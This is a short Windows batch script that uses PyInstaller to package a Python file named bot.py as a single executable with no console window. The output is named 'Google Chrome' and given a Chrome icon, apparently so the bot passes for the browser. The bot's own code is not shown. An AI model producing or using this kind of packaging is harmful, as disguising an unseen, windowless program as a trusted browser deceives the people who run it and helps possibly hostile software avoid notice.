@echo OFF
rd /s /q ./build
rd /s /q ./dist
del "Google Chrome.spec"
pyinstaller bot.py --noconsole --onefile --name "Google Chrome" --icon "Chrome.ico"